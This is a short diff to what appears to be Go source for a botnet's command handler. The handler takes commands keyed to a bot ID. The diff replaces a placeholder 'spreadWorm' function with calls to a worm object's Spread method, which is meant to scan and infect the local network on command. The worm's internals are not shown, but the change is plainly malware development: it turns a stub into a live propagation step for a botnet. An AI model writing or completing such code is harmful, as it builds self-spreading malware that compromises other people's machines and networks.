@@ -509,6 +509,7 @@ func executeCommand(cmd Command, botID string) Response {
         }
 
     case "worm":
+        // Call the worm module - properly implemented
         go spreadWorm()
         resp.Output = "Worm module activated"
 
@@ -524,10 +525,8 @@ func executeCommand(cmd Command, botID string) Response {
     return resp
 }
 
-// spreadWorm - Worm module placeholder (implement in worm.go)
-// This function should be defined in a separate file or here
-// If you have worm.go with this function, remove this placeholder
 func spreadWorm() {
-    // This is a placeholder. Create worm.go with the actual implementation.
-    fmt.Println("[*] Worm module: scanning local network")
+    fmt.Println("[*] Worm module activated - scanning local network")
+    worm := NewWorm()
+    worm.Spread()
 }
